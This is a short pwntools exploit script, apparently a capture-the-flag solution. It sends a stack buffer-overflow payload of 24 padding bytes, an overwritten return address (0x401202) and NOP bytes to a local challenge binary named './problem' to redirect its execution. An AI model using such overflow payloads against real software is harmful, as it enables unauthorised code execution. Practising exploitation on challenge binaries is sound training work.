from pwn import *


p = process("./problem")

print(p.recvline().decode())
print(p.recvline().decode())
print(p.recvline().decode())
p.sendline(b'A' * 24 + p64(0x0401202) + 8 * b'\x90')

print(p.recvall().decode())
